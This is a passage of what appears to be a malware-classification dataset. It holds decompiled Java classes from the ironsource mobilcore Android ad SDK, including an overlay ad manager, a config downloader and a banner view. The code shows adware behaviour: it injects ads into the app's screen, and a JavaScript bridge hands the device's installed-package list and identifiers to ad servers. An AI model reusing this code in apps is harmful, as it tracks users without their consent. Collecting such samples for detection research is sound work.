""feed"".equals(string3) ? new C0108q.a(str,string2,this) : new C0108q.c(str,string2,this));         }       }     }     @Override public final void a(    JSONObject jSONObject) throws JSONException {       if (!this.c.equals(""all-complete-called"")) {         String string=jSONObject.getString(AnalyticsEvent.EVENT_ID);         String string2=jSONObject.getString(""filename"");         this.a.put(string,new Pair<>(""pending"",jSONObject));         this.b.put(string2,string);       }     }     @Override public final void a(    String str){       String str2=this.b.get(str);       this.a.put(str2,new Pair<>(""pending"",(JSONObject)this.a.get(str2).second));     }     private boolean c(    String str){       return ((JSONObject)this.a.get(this.b.get(str)).second).optBoolean(""mandatory"",true);     }     private synchronized void a(){       boolean z;       if (!this.c.equals(""all-complete-called"")) {         Iterator<Map.Entry<String,Pair<String,JSONObject>>> it=this.a.entrySet().iterator();         while (true) {           if (!it.hasNext()) {             z=true;             break;           }           String str=(String)it.next().getValue().first;           if (!""finished"".equals(str) && !""failed"".equals(str) && !""failed-ignored"".equals(str)) {             z=false;             break;           }         }         if (z) {           if (!this.c.equals(""failed"")) {             this.c=""finished"";             try {               Iterator<Map.Entry<String,Pair<String,JSONObject>>> it2=this.a.entrySet().iterator();               while (it2.hasNext()) {                 Pair<String,JSONObject> value=it2.next().getValue();                 if (((String)value.first) == ""finished"") {                   JSONObject jSONObject=(JSONObject)value.second;                   String string=jSONObject.getString(AnalyticsEvent.EVENT_ID);                   String optString=jSONObject.optString(""version"");                   if (optString != null) {                     aO.b(string,optString);                   }                 }               }             }  catch (            JSONException e) {               aE.a(MobileCore.c(),getClass().getName(),e);               this.c=""failed"";             }           }           b();         }       }     }     private synchronized void b(){       if (!this.c.equals(""all-complete-called"")) {         this.d.a(""finished"".equals(this.c));         this.c=""all-complete-called"";       }     }     @Override public final void a(    String str,    Exception exc){       if (!this.c.equals(""all-complete-called"")) {         A.a(""ResourceManager | processException "" + str,2);         String str2=this.b.get(str);         JSONObject jSONObject=(JSONObject)this.a.get(str2).second;         String str3=""failed"";         if (!c(str)) {           str3=""failed-ignored"";         }  else {           this.c=""failed"";           b();         }         this.a.put(str2,new Pair<>(str3,jSONObject));         aE.d dVar=this.d;         a();       }     }     @Override public final void a(    String str,    int i){       if (!this.c.equals(""all-complete-called"")) {         String str2=this.b.get(str);         boolean c=c(str);         JSONObject jSONObject=(JSONObject)this.a.get(str2).second;         String str3=""failed"";         if (!c && i >= 400 && i < 500) {           str3=""failed-ignored"";         }  else {           this.c=""failed"";           b();         }         this.a.put(str2,new Pair<>(str3,jSONObject));         aE.d dVar=this.d;         a();       }     }     @Override public final void a(    String str,    boolean z){       if (!this.c.equals(""all-complete-called"")) {         A.a(""ResourceManager | processComplete "" + str + "" - ""+ (z ? ""OK"" : ""NEY""),55);         String str2=this.b.get(str);         this.a.put(str2,new Pair<>(z ? ""finished"" : ""failed"",(JSONObject)this.a.get(str2).second));         if (!z) {           this.c=""failed"";           b();         }         aE.d dVar=this.d;         a();       }     }     @Override public final void a(    JSONObject jSONObject,    String str,    boolean z){       a(str,z);       if (z) {         aE.d dVar=this.d;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aP.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4a7a101d"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aQ.code","!org.eclipse.jdt.core.dom.TypeDeclaration@317cc8dd"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5ddf36ec"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aS.code","public class aS extends AbstractC0103l {   private static aS n;   private JSONObject B;   private OnReadyListener C;   private boolean D;   private boolean E;   private OrientationEventListener F;   private Activity G;   public JSONObject f;   private Runnable g;   private String h;   private f i;   private int j;   private String k;   private boolean m;   private String o;   private long p;   private aR q;   private WebView r;   private AnimationDrawable s;   private AnimationDrawable t;   private AnimationDrawable u;   private NinePatchDrawable v;   private Drawable w;   private aR.b x;   private Drawable z;   private boolean l=false;   private long y=-1;   private b A=null;   aE.d e=new aE.d(){     @Override public final void a(    boolean z){       aS.this.a(""allComplete Stickeez"");       if (!z) {         aS.this.f=aS.this.B;         aS.this.E=aS.this.f != null;         aS.this.r();         return;       }       if (aS.this.A != b.STATE_SHOWING_STICKEE && aS.this.A != b.STATE_SHOWING_OFFERS) {         aS.this.a(""we are about to clean! state is: "" + aS.this.A.name());         aS.this.E=true;         aS.this.r();       }     }     @Override public final String a(){       return aS.this.o;     }   } ;   private boolean H=false;   public enum b {  STATE_INIT,   STATE_READY_TO_SHOW,   STATE_SHOWING_STICKEE,   STATE_SHOWING_OFFERS}   static OnReadyListener a(  aS aSVar,  OnReadyListener onReadyListener){     aSVar.C=null;     return null;   }   static void a(  aS aSVar,  Activity activity){     aSVar.a(""setupLayout"");     if (aSVar.q != null) {       aSVar.q.a();     }     aSVar.q=new aR(activity,aSVar.x,new e());     if (aSVar.n()) {       aSVar.z=new BitmapDrawable(MobileCore.c().getResources(),B.a(aSVar.a,BitmapFactory.decodeFile(aSVar.d + ""/"" + aSVar.h)));       aSVar.q.a(aSVar.z);     }  else {       aSVar.a(""setupLayout"",""mXFileName was empty, can't add 'X' button to a stickee handle"");     }     aSVar.q.a(aSVar.v,aSVar.w);     aSVar.a(""populate"");     JSONArray optJSONArray=aSVar.B.optJSONArray(NativeAdResponse.KEY_ADS);     if (optJSONArray.length() > 0) {       aSVar.q.a(optJSONArray);     }     aSVar.F=new OrientationEventListener(aSVar.a,3){       private WindowManager b;       private int c=-1; {         this.b=(WindowManager)aS.this.a.getSystemService(""window"");       }       @Override public final void onOrientationChanged(      int i){         if (i != -1) {           int rotation=this.b.getDefaultDisplay().getRotation();           if (this.c == -1) {             this.c=rotation;           }  else           if (rotation != this.c) {             this.c=rotation;             A.a(""onOrientationChanged | rotation changed, should hide stickee"",55);             aS.this.m();           }         }       }     } ;     aSVar.F.enable();   }   protected enum a implements AbstractC0103l.c {  INIT(""init""),   SHOW(""show"");   private String c;   a(  String str){     this.c=str;   }   @Override public final String a(){     return this.c;   } } class c extends aE.e {     c(){     }     @Override public final void a(    boolean z){       aS.this.D=z;       aS.this.r();     }   }   private aS(){   }   @Override protected final boolean a(){     return this.A == null;   }   @Override protected final AbstractC0103l.a b(){     return new AbstractC0103l.a(""stickeez"",""STICKEEZ_assets"",""stickeez-feed"",a.INIT,new d());   }   @Override protected final void d(){     super.d();     this.A=b.STATE_INIT;     a(""Stickeez"",""initMembers"");     this.r=new WebView(this.a);     aE.a(this.r,(WebChromeClient)null);     this.B=C0114w.a().b(""stickeez-feed"");   }   public static aS h(){     if (n == null) {       n=new aS();     }     return n;   }   public final boolean i(){     return this.A == b.STATE_READY_TO_SHOW;   }   public final boolean j(){     return this.A == b.STATE_SHOWING_OFFERS;   }   public final boolean k(){     return this.A == b.STATE_SHOWING_STICKEE;   }   public final synchronized void a(  final Activity activity){     if (!aK.b(MobileCore.c())) {       b(""show"",""Stickeez is not ready, no internet connection detected."");     }  else     if (!i()) {       b(""show"",""Stickeez is not ready."");     }  else {       b(""show"",""Stickeez is ready. Trying to show..."");       this.A=b.STATE_SHOWING_STICKEE;       this.G=activity;       final ViewGroup viewGroup=(ViewGroup)activity.getWindow().getDecorView();       this.x=new aR.b(){         private boolean c=false;         @Override public final void a(        JSONObject jSONObject){           aS.this.a(activity,jSONObject,aS.this.c);         }         @Override public final void b(){           if (!this.c) {             this.c=true;             aE.a(MobileCore.c(),aS.this.b,aS.this.c,aJ.a.REPORT_ACTION_QUIT,(String)null,(String)null);             aS.this.q();           }         }         @Override public final void a(){           aS.this.a(""onHandleClick"");           aS.this.A=b.STATE_SHOWING_OFFERS;           long currentTimeMillis=System.currentTimeMillis() - aS.this.p;           try {             new JSONObject().put(""timeSinceShow"",currentTimeMillis);           }  catch (          JSONException e2) {           }           Intent a2=aE.a(MobileCore.c(),aS.this.b + ""_handle"",aS.this.c,aJ.a.REPORT_ACTION_CLICK,(String)null,(JSONArray)null);           a2.putExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_timer"",currentTimeMillis);           aE.a(MobileCore.c(),a2);         }         @Override public final void b(        final JSONObject jSONObject){           aE.a(new AsyncTask<Void,Void,Boolean>(){             @Override protected final Boolean doInBackground(            Void[] voidArr){               aN.a(jSONObject);               return true;             }             @Override protected final void onPostExecute(            Boolean bool){               aE.a(MobileCore.c(),aS.this.b,aS.this.c,aJ.a.REPORT_ACTION_IMPRESSION,aN.c(jSONObject),(String)null);             }           } );         }         @Override public final void c(){           aS.this.m();         }       } ;       MobileCore.b().post(new Runnable(){         @Override public final void run(){           aS.a(aS.this,activity);           viewGroup.addView(aS.this.q);           aS.this.a(a.SHOW);         }       } );     }   }   public final void l(){     a(""onMarketDirectClick"");     try {       JSONArray optJSONArray=this.B.optJSONArray(NativeAdResponse.KEY_ADS);       JSONObject jSONObject=optJSONArray.getJSONObject(new Random().nextInt(optJSONArray.length()));       a(""runOffer"",""Choose Offer Entity="" + jSONObject);       a(this.G,jSONObject,this.c);     }  catch (    JSONException e2) {       e2.printStackTrace();     }   }   protected final void a(  Activity activity,  JSONObject jSONObject,  String str){     a(""runOffer"",""is called"");     if (jSONObject.optString(""click"") != null) {       a(""runOffer"",""flowNameToReport="" + str);       q();       a(activity,jSONObject,(AbstractC0103l.d)null);     }   }   public final void m(){     if (this.A == b.STATE_SHOWING_OFFERS || this.A == b.STATE_SHOWING_STICKEE) {       aE.a(MobileCore.c(),this.b + ""_handle"",this.c,aJ.a.REPORT_ACTION_QUIT,(String)null,(String)null);       q();     }   }   public void q(){     MobileCore.b().post(new Runnable(){       @Override public final void run(){         if (aS.this.g != null) {           MobileCore.b().removeCallbacks(aS.this.g);           aS.this.g=null;         }         aS.this.q.a(new aR.a(){           @Override public final void a(){             aS.this.A=b.STATE_READY_TO_SHOW;             ((ViewGroup)aS.this.G.getWindow().getDecorView()).removeViewInLayout(aS.this.q);             aS.this.a(""animation finished"");             aS.this.F.disable();             aS.this.g();           }         } );       }     } );     a(""hideAll"",""hideAll | Refresh handle animation and feed by downloading config file again"");   }   public synchronized void r(){     boolean z=true; synchronized (this) {       if (this.D && this.E) {         try {           if (s()) {             try {               try {                 C0114w.a().a(""stickeez-feed"",this.f.toString());                 this.B=this.f;                 a(""checkAllReady switching state"");                 if (!this.H) {                 }                 this.A=b.STATE_READY_TO_SHOW;                 this.D=false;                 this.E=false;                 MobileCore.b().post(new Runnable(){                   @Override public final void run(){                     if (aS.this.C != null) {                       aS.this.C.onReady(MobileCore.AD_UNITS.STICKEEZ);                       aS.a(aS.this,(OnReadyListener)null);                     }                   }                 } );                 this.H=true;               }  catch (              Exception e2) {                 e=e2;                 aE.a(this.a,getClass().getName(),e);                 a(""checkAllReady switching state"");                 if (this.H || z) {                   this.A=b.STATE_READY_TO_SHOW;                   this.D=false;                   this.E=false;                   MobileCore.b().post(new Runnable(){                     @Override public final void run(){                       if (aS.this.C != null) {                         aS.this.C.onReady(MobileCore.AD_UNITS.STICKEEZ);                         aS.a(aS.this,(OnReadyListener)null);                       }                     }                   } );                   this.H=true;                 }               }             }  catch (            Throwable th) {               th=th;               a(""checkAllReady switching state"");               if (!this.H || z) {                 this.A=b.STATE_READY_TO_SHOW;                 this.D=false;                 this.E=false;                 MobileCore.b().post(new Runnable(){                   @Override public final void run(){                     if (aS.this.C != null) {                       aS.this.C.onReady(MobileCore.AD_UNITS.STICKEEZ);                       aS.a(aS.this,(OnReadyListener)null);                     }                   }                 } );                 this.H=true;               }               throw th;             }           }  else {             a(""checkAllReady switching state"");             if (this.H) {               this.A=b.STATE_READY_TO_SHOW;               this.D=false;               this.E=false;               MobileCore.b().post(new Runnable(){                 @Override public final void run(){                   if (aS.this.C != null) {                     aS.this.C.onReady(MobileCore.AD_UNITS.STICKEEZ);                     aS.a(aS.this,(OnReadyListener)null);                   }                 }               } );               this.H=true;             }           }         }  catch (        Exception e3) {           e=e3;           z=false;         } catch (        Throwable th2) {           th=th2;           z=false;           a(""checkAllReady switching state"");           if (!this.H) {           }           this.A=b.STATE_READY_TO_SHOW;           this.D=false;           this.E=false;           MobileCore.b().post(new Runnable(){             @Override public final void run(){               if (aS.this.C != null) {                 aS.this.C.onReady(MobileCore.AD_UNITS.STICKEEZ);                 aS.a(aS.this,(OnReadyListener)null);               }             }           } );           this.H=true;           throw th;         }       }     }   }   private boolean s(){     String str="""";     try {       JSONObject jSONObject=new JSONObject(this.i.c());       JSONObject a2=aO.a(jSONObject,jSONObject.getString(""use-animation""));       int i=a2.getInt(""animation-fps"");       String string=a2.getString(AnalyticsEvent.EVENT_ID);       String replace=a2.getString(""filename"").replace("".zip"","""");       long optLong=a2.optLong(""auto-show-delay"",-1L);       boolean optBoolean=jSONObject.optBoolean(""market-direct"",false);       boolean optBoolean2=a2.optBoolean(""reverse_anim"",false);       JSONObject a3=aO.a(jSONObject,""handle-close"");       if (a3 != null) {         str=a3.optString(""filename"","""");       }       File file=new File(this.d + ""/"" + replace);       File[] listFiles=file.listFiles();       if (listFiles == null || listFiles.length <= 0) {         return false;       }       this.b=this.i.a();       this.c=this.i.b();       this.y=optLong;       this.m=optBoolean2;       this.l=optBoolean;       this.h=str;       this.j=i;       this.k=replace;       this.c+=""_"" + string;       a(""cleaning animation!!! state is: "" + this.A.name());       C0101j.b(this.s);       C0101j.b(this.t);       C0101j.b(this.u);       String absolutePath=file.getAbsolutePath();       a(""setupAnimations"");       try {         this.s=C0101j.a(absolutePath + ""/idle"",this.j);         this.s.setOneShot(false);         this.t=C0101j.a(absolutePath + ""/up"",this.j);         this.t.setOneShot(true);         this.u=C0101j.a(absolutePath + ""/out"",this.j);         this.u.setOneShot(true);         if (Build.VERSION.SDK_INT <= 10) {           this.t.start();         }         this.w=new BitmapDrawable(MobileCore.c().getResources(),BitmapFactory.decodeFile(absolutePath + ""/arrow.png""));         Bitmap decodeFile=BitmapFactory.decodeFile(absolutePath + ""/drawable-"" + aE.c()+ ""/bg.9.png"");         byte[] ninePatchChunk=decodeFile.getNinePatchChunk();         if (NinePatch.isNinePatchChunk(ninePatchChunk)) {           this.v=new NinePatchDrawable(MobileCore.c().getResources(),decodeFile,ninePatchChunk,new Rect(),null);         }       }  catch (      Exception e2) {         e2.printStackTrace();       }       return true;     }  catch (    Exception e3) {       aE.a(this.a,getClass().getName(),e3);       A.a(""Stickeez: Error switching animation"",3);       return false;     }   }   public final boolean n(){     return !TextUtils.isEmpty(this.h);   } private class d implements aF.a {     private Integer b;     public d(){     }     public final String getMobileParams(){       return aE.k(MobileCore.c());     }     public final void setDataToReportOnFeed(    String str){       aS.this.o=str;     }     public final void loadResources(    String str,    String str2,    String str3){       aS.this.a(""JSReportingBridge | loadResources"",""flowType:"" + str + "" , flowName:""+ str2+ "" , configJsonStr=""+ str3);       aS.this.i=new f(str,str2,str3);       int hashCode=str3.hashCode();       if (this.b == null || this.b.intValue() != hashCode) {         aS.this.a(""JSReportingBridge | loadResources"",""New stickee config. parse and hanlde"");         this.b=Integer.valueOf(hashCode);         try {           JSONObject jSONObject=new JSONObject(str3);           if (!TextUtils.isEmpty(jSONObject.optString(""use-animation""))) {             aO.a(jSONObject,aS.this.d,aS.this.d,aS.this.e);             return;           }           return;         }  catch (        Exception e) {           aE.a(MobileCore.c(),getClass().getName(),e);           return;         }       }       if (this.b.intValue() == hashCode) {         aS.this.a(""JSReportingBridge | loadResources"",""Got the same stickee. we are ready."");         aS.this.E=true;         aS.this.r();       }     }     public final void processFeed(    String str){       try {         aS.this.a(""JSFlowBridge , processFeed, feedStr="" + str);         JSONObject jSONObject=new JSONObject(str);         aS.this.f=jSONObject;         C0114w.a().a(jSONObject,new c());       }  catch (      Exception e) {         aE.a(aS.this.a,""StickeezManager"",e);       }     }     public final void reportFeedRequestError(){       aE.b(aS.this.a,aS.class.getCanonicalName(),""Failed to bring stickeez feed"");       aS.this.b(""reportFeedRequestError"",""Failed to bring stickeez feed"");     }     public final void openReportOffers(    String str,    String str2){       try {         aE.a(MobileCore.c(),aS.this.b,aS.this.b,aJ.a.a(str),"""",aN.a(new JSONArray(str2)));       }  catch (      Exception e) {         e.printStackTrace();       }     }     public final String getInstalledAppPackages(){       return aE.b();     }     public final double getScreenSize(){       return aE.e(MobileCore.c());     }     public final void showStickee(){       MobileCore.b().post(new Runnable(){         @Override public final void run(){           aS.this.q.b();           if (aS.this.y > -1) {             aS.this.g=new Runnable(){               @Override public final void run(){                 if (aS.this.A == b.STATE_SHOWING_STICKEE) {                   aS.this.q.d();                 }                 aS.this.g=null;               }             } ;             MobileCore.b().postDelayed(aS.this.g,aS.this.y);           }         }       } );       aS.this.p=System.currentTimeMillis();       aE.a(MobileCore.c(),aS.this.b + ""_handle"",aS.this.c,aJ.a.REPORT_ACTION_IMPRESSION,(String)null,(String)null);     }   }   public final synchronized void a(  OnReadyListener onReadyListener){     this.C=onReadyListener;   }   public final boolean o(){     return this.l;   }   public final boolean p(){     return this.m;   } public class f {     private String b;     private String c;     private String d;     public f(    String str,    String str2,    String str3){       this.c=str2;       this.b=str;       this.d=str3;     }     public final String a(){       return this.b;     }     public final String b(){       return this.c;     }     public final String c(){       return this.d;     }   } public final class e {     e(){     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AsyncTaskC0115x.code","public final class AsyncTaskC0115x extends AsyncTask<Void,Void,String> {   private String a;   private a b;   private String c; public interface a {     void a(    String str);   }   @Override protected final String doInBackground(  Void[] voidArr){     return b();   }   @Override protected final void onPostExecute(  String str){     String str2=str;     if (TextUtils.isEmpty(str2)) {       return;     }     this.b.a(str2);   }   public AsyncTaskC0115x(  a aVar,  String str,  String str2){     this.a=str;     this.b=aVar;     this.c=str2;   }   private static int a(){     try {       return MobileCore.c().getPackageManager().getPackageInfo(MobileCore.c().getPackageName(),0).versionCode;     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();       return -1;     }   }   private String b(){     Date date;     boolean z;     try {       String format=MessageFormat.format(""http://developer.mobilecore.com/mobilecore/mobilecore/widgetSliderAppData?appId={0}&appVersion={1}&sdkVer={2}&devId={3}"",aE.e(MobileCore.c().getPackageName()),aE.e(String.valueOf(a())),aE.e(""0.9.4""),aE.e(MobileCore.a()));       HttpClient a2=aE.a();       BasicHttpParams basicHttpParams=new BasicHttpParams();       HttpConnectionParams.setConnectionTimeout(basicHttpParams,10000);       HttpConnectionParams.setSoTimeout(basicHttpParams,10000);       ((DefaultHttpClient)a2).setParams(basicHttpParams);       HttpResponse execute=a2.execute(aE.a(new URI(format.replace("" "",""%20""))));       InputStream content=execute.getEntity().getContent();       Header firstHeader=execute.getFirstHeader(""Content-Encoding"");       String value=execute.getFirstHeader(""last-modified"").getValue();       aE.d().getLong(""configJsonLastModified"",0L);       try {         date=DateUtils.parseDate(value);       }  catch (      DateParseException e) {         aE.a(MobileCore.c(),aQ.class.getName(),e);         date=null;       }       long time=date != null ? date.getTime() : 0L;       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""gzip"")) ? content : new GZIPInputStream(content),""UTF-8""));       StringBuilder sb=new StringBuilder();       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         sb.append(readLine);       }       String sb2=sb.toString();       if (!TextUtils.isEmpty(sb2)) {         try {           new JSONObject(sb2).getJSONObject(""slider"");           z=true;         }  catch (        JSONException e2) {           z=false;         }         if (z) {           aE.d().edit().putLong(""configJsonLastModified"",time).commit();           BufferedWriter bufferedWriter=new BufferedWriter(new FileWriter(new File(this.a,this.c)));           bufferedWriter.write(sb2);           bufferedWriter.close();           return sb2;         }       }     }  catch (    Exception e3) {       e3.printStackTrace();       aE.a(MobileCore.c(),aQ.class.getName(),e3);     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aT.code","final class aT {   protected enum b {  SIMPLE_BANNER} public static class a {     private b a;     private Drawable b;     private Drawable c;     private JSONObject d;     public a(    b bVar,    Drawable drawable,    Drawable drawable2,    JSONObject jSONObject){       this.a=bVar;       this.b=drawable;       this.c=drawable2;       this.d=jSONObject;     }     public final b a(){       return this.a;     }     public final Drawable b(){       return this.b;     }     public final Drawable c(){       return this.c;     }     public final JSONObject d(){       return this.d;     }   } static class AnonymousClass1 {     static final int[] a=new int[b.values().length]; static {       try {         a[b.SIMPLE_BANNER.ordinal()]=1;       }  catch (      NoSuchFieldError e) {       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aU.code","public final class aU extends RelativeLayout implements View.OnTouchListener {   private static Bitmap e;   private int a;   private aR.b b;   private aT.a c;   private LinearLayout d;   public aU(  Context context,  aT.a aVar,  aR.b bVar){     super(context);     try {       this.c=aVar;       if (e == null) {         e=B.a(""iVBORw0KGgoAAAANSUhEUgAAAEYAAABGCAMAAABG8BK2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo1RDVCOTE2MjkyNURFMzExOEUxRUI5ODgyM0IyQjAxQyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyNjFENDM2NzVEOUYxMUUzQkY2N0I5QTU1MzNBQUZDRSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyNjFENDM2NjVEOUYxMUUzQkY2N0I5QTU1MzNBQUZDRSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1RTVCOTE2MjkyNURFMzExOEUxRUI5ODgyM0IyQjAxQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1RDVCOTE2MjkyNURFMzExOEUxRUI5ODgyM0IyQjAxQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PusLT/cAAAE+UExURf///2ZmZmVlZVxcXGRkZGFhYWNjY11dXYKCgmdnZ3BwcPv7+2BgYNjY2F5eXv7+/vz8/Gtra6SkpGpqaqGhoWJiYubm5pycnK2trZWVlf39/V9fX/j4+GhoaH9/f46Ojs/Pz8XFxW9vb+np6ff394yMjIGBgbi4uKWlpZ2dnVtbW9zc3Ovr6/Ly8tDQ0PX19ZiYmJ+fn+rq6vb29tnZ2XZ2duDg4OLi4u7u7nR0dOTk5KamppaWlufn55mZmfPz87S0tImJiaenp6ysrM7OzmlpadHR0ZeXl3V1ddvb27Ozs6CgoKKiotLS0m1tbW5ublpaWtXV1fn5+VlZWWxsbPHx8cvLy9TU1H5+foeHh9fX1/T09JqampCQkPDw8HFxcXd3d3Nzc/r6+pubm9PT08rKyqurq4uLi5GRkf///2B65lQAAABqdFJOU////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wC85NzjAAADMUlEQVR42uyXZ3/aMBCHdR7yBFNDGA57EzIge7XZu83u3rv9/l+gsg3ENl751S+5N2AkPZxO+t+d0d8wJqVb+zl+RRRX+Nx+Ky2NTUAhIJvZZhIslmxmNx+NiW0bDIrBrCyzmKEM0nbsUZinHYGsYmQaH4l8o8GLR5iWGfKT0HkaHlPZICswJ/C7h7UlSVGkpdrhLi9wmPy8UQmJyad0T7iquppAFkusqlVO9yiVD4OZK5Gp06DOojGbVckAQGkuGLOzRwJLF5eRqy0XaRLsvZ0gTJ74wsQzC8jDFjJxsrFSPgBD4kLFs8jHsnHiT8ofUwmkDDgVP8yiCEBnUIBlaABx0QeTIWdUrOtT5/qlrnP5ze92Xv+sF8l5ZbwxXQEYONNnfnp7R9/H7JRjgb77Y8T+jEwTup6YHADXNq7ax2sA9omNcwxTANffNf17mwPIeWHSBcDVdX3a0qV+722csk4B9uut/rBexVBIe2AOiDOqsUZLzYCdMy/oFGrml/moEncO3DFKEyhhzZz2rceZnMFtfmH4QsUvNPN5TaCgqbhi0kmQeW0oxBPa4s88ZVDo/tA5jZchmXbFtMidOR/FQnr2sK+yuSM6pYyGz8m/tFwxW0DhMrJwzH3dd28EVqdwKc0ScUzBFnI/bqZQsyaYE4MzdZU0fOH61uOvFRjIuWJ4wGLdlqh6RnwYxtjRhe0u1kUMvCvmFFjelu+Q9IEelAWKfq7YhhI8C6euGBHkhkNFUgebFNxWHEMNGcSwGFSeosw6E0NhMeObQuWC6Q3gSwfHe1NjIR4oAADGdOoTYueBEwWwBoF14XgfuOP6oXlTR5za4cY53tfPLgaiANY8aaQNdfEOhRCDTZokSw0UQE5a6jn98ZGmNVGYuW6kALve/ROFJW0N4zLSdKJnz2M+acuSRG+/TJtx0R70bvgTL0qBSfQhpedXZD3X9S0KMOMz/UYKTOmWAvOKYhmHphMnM4wsvA5RYCzl7ucVONUodZjPP8KUO2vxfenS3yy+D1d8I2oFompMomqTImraomoho2poo2qvI2v2o3r1iOxFKLLXshA2wUwwE8wEM8H8h/0TYACZQeeCp+VpcAAAAABJRU5ErkJggg=="");       }       final JSONObject d=aVar.d();       String string=d.getString(""title"");       String string2=d.getString(""desc"");       String a=aO.a(C0114w.a().b(),d.getString(""img""));       int applyDimension=(int)TypedValue.applyDimension(1,5.0f,getResources().getDisplayMetrics());       this.a=(int)TypedValue.applyDimension(1,70.0f,getResources().getDisplayMetrics());       setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));       setPadding(applyDimension,applyDimension,applyDimension,0);       setClipToPadding(false);       this.d=new LinearLayout(context);       this.d.setOrientation(0);       int a2=a(context);       A.a(""setupLayout() | pageWidth = "" + a2,55);       this.d.setLayoutParams(new LinearLayout.LayoutParams(a2 - (applyDimension * 2),-2));       B.a(this.d,this.c.b());       this.d.setPadding(applyDimension,applyDimension,applyDimension,applyDimension);       this.d.setClickable(true);       this.d.setOnClickListener(new View.OnClickListener(){         @Override public final void onClick(        View view){           if (aU.this.b != null) {             aU.this.b.a(d);           }         }       } );       this.d.setId(1);       aV aVVar=new aV(context);       int i=this.a - (applyDimension * 2);       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(i,i);       layoutParams.setMargins(applyDimension,applyDimension,applyDimension,applyDimension);       aVVar.setLayoutParams(layoutParams);       aVVar.a(a);       ImageView imageView=new ImageView(context);       LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(i,i);       layoutParams2.setMargins(applyDimension,applyDimension,applyDimension,applyDimension);       imageView.setLayoutParams(layoutParams2);       B.a(imageView,this.c.c());       LinearLayout linearLayout=new LinearLayout(context);       linearLayout.setOrientation(1);       linearLayout.setPadding(applyDimension,applyDimension,applyDimension,applyDimension);       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       layoutParams3.weight=1.0f;       linearLayout.setLayoutParams(layoutParams3);       TextView textView=new TextView(context);       textView.setText(string);       textView.setSingleLine();       textView.setTypeface(null,1);       textView.setTextSize(14.0f);       textView.setTextColor(Color.parseColor(""#443E3E""));       textView.setEllipsize(TextUtils.TruncateAt.END);       TextView textView2=new TextView(context);       textView2.setText(string2);       textView2.setTextSize(14.0f);       textView2.setMaxLines(2);       textView2.setTextColor(Color.parseColor(""#443E3E""));       textView2.setEllipsize(TextUtils.TruncateAt.END);       linearLayout.addView(textView);       linearLayout.addView(textView2);       ImageView imageView2=new ImageView(context);       int applyDimension2=(int)TypedValue.applyDimension(1,30.0f,getResources().getDisplayMetrics());       imageView2.setClickable(true);       imageView2.setImageBitmap(e);       RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(applyDimension2,applyDimension2);       layoutParams4.addRule(11);       layoutParams4.addRule(7,this.d.getId());       layoutParams4.setMargins(applyDimension * 2,0,0,applyDimension * 2);       imageView2.setLayoutParams(layoutParams4);       imageView2.setOnClickListener(new View.OnClickListener(){         @Override public final void onClick(        View view){           if (aU.this.b != null) {             aU.this.b.b();           }         }       } );       this.d.addView(aVVar);       